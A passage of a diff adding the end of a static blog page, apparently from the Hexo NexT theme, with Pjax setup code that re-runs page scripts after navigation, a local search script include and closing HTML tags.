+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+  
+
+    </div>
+</body>
+</html>
